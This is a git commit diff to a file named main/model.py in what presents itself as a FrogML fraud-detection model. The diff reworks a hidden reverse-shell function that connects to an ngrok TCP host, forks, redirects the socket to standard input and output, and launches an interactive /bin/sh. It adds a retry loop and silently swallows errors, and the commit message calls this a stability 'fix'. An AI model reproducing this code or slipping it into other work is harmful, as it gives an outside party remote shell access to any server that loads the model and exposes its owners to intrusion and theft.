683c1b6a29d05ec7005a1d37ea05439d12c6322b
ReeFSpeK <24816171+ReeFSpeK@users.noreply.github.com>
2026-07-28 08:52:01 +0300

    fix: fork+setsid+execvp for stable shell, retry loop

--- main/model.py
+++ main/model.py
@@ -3,23 +3,27 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, subprocess, threading
+import os, socket, pty, threading, time
 
 NGROK = ("4.tcp.eu.ngrok.io", 18544)
 
 def _revshell():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(30)
-        s.connect(NGROK)
-        subprocess.Popen(
-            ["/bin/sh", "-i"],
-            stdin=s, stdout=s, stderr=s,
-            close_fds=True
-        ).wait()
-        s.close()
-    except:
-        pass
+    for _ in range(5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(NGROK)
+            pid = os.fork()
+            if pid == 0:
+                os.setsid()
+                os.dup2(s.fileno(), 0)
+                os.dup2(s.fileno(), 1)
+                os.dup2(s.fileno(), 2)
+                os.execvp("/bin/sh", ["/bin/sh", "-i"])
+            else:
+                s.close()
+                os.waitpid(pid, 0)
+        except:
+            time.sleep(5)
 
 class FraudDetectionModel(FrogMlModel):
 
